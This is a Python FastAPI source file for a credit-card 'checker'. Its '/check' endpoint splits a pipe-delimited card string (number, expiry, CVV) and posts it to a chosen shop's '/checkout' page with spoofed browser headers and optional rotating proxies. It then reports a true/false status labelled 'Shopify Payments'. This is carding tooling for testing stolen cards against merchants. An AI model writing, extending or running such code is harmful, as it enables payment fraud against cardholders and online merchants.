from fastapi import FastAPI, Query, Request
import httpx

app = FastAPI()

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

@app.api_route("/check", methods=["GET", "POST"])
async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), amount: str = "31.0"):
    try:
        if not site.startswith("http"):
            site = f"https://{site}"
            
        request_headers = HEADERS.copy()
        request_headers["Referer"] = f"{site}/"
        request_headers["Origin"] = site

        cc_parts = cc.split('|')
        payload = {
            "card[number]": cc_parts[0] if len(cc_parts) > 0 else cc,
            "card[exp_month]": cc_parts[1] if len(cc_parts) > 1 else "",
            "card[exp_year]": cc_parts[2] if len(cc_parts) > 2 else "",
            "card[cvv]": cc_parts[3] if len(cc_parts) > 3 else "",
            "amount": amount
        }

        formatted_proxy = None
        if proxy:
            clean_proxy = proxy.strip().replace("http://", "").replace("https://", "")
            if "@" in clean_proxy:
                formatted_proxy = f"http://{clean_proxy}"
            else:
                parts = clean_proxy.split(":")
                if len(parts) == 4:
                    formatted_proxy = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
                else:
                    formatted_proxy = f"http://{clean_proxy}"
                    
        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy) if formatted_proxy else None

        async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
            # تم تغيير المسار ليكون عاماً لـ Shopify
            target_url = f"{site}/checkout" 
            
            response = await client.post(target_url, data=payload)
            
            try:
                data = response.json()
                msg = data.get("message") or data.get("error") or f"Code: {response.status_code}"
            except:
                msg = f"Status: {response.status_code}"
            
            return {
                "Gateway": "Shopify Payments",
                "Price": amount,
                "Proxy": "Live" if proxy else "None",
                "Response": msg,
                "Status": "true" if response.status_code == 200 else "false",
                "CC": cc
            }

    except Exception as e:
        return {
            "Gateway": "Shopify Payments",
            "Price": amount,
            "Proxy": "Error",
            "Response": str(e),
            "Status": "false",
            "CC": cc
        }

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
